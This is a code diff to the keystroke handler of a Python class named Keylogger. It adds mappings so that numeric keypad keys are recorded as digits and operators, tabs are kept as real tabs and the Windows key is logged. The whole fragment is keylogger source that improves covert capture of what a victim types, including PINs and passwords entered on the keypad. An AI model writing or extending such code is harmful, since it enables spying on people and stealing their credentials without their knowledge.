@@ -20,14 +20,48 @@ class Keylogger:
 
     def on_press(key):
         try:
-            keylogger.log += format(key.char)
+            if hasattr(key, 'vk') and 96 <= key.vk <= 111:
+                if key.vk == 96:
+                    keylogger.log += "0"
+                elif key.vk == 97:
+                    keylogger.log += "1"
+                elif key.vk == 98:
+                    keylogger.log += "2"
+                elif key.vk == 99:
+                    keylogger.log += "3"
+                elif key.vk == 100:
+                    keylogger.log += "4"
+                elif key.vk == 101:
+                    keylogger.log += "5"
+                elif key.vk == 102:
+                    keylogger.log += "6"
+                elif key.vk == 103:
+                    keylogger.log += "7"
+                elif key.vk == 104:
+                    keylogger.log += "8"
+                elif key.vk == 105:
+                    keylogger.log += "9"
+                elif key.vk == 106:
+                    keylogger.log += "*"
+                elif key.vk == 107:
+                    keylogger.log += "+"
+                elif key.vk == 109:
+                    keylogger.log += "-"
+                elif key.vk == 110:
+                    keylogger.log += ","
+                elif key.vk == 111:
+                    keylogger.log += "/"
+            else:
+                keylogger.log += format(key.char)
         except AttributeError:
             if key == keyboard.Key.space:
                 keylogger.log += " "
             elif key == keyboard.Key.enter:
                 keylogger.log += "\n"
             elif key == keyboard.Key.tab:
-                keylogger.log += "[tab]"
+                keylogger.log += "\t"
+            elif key == keyboard.Key.cmd:
+                keylogger.log += "⊞"
             elif key == keyboard.Key.backspace:
                 keylogger.delete_last()
 
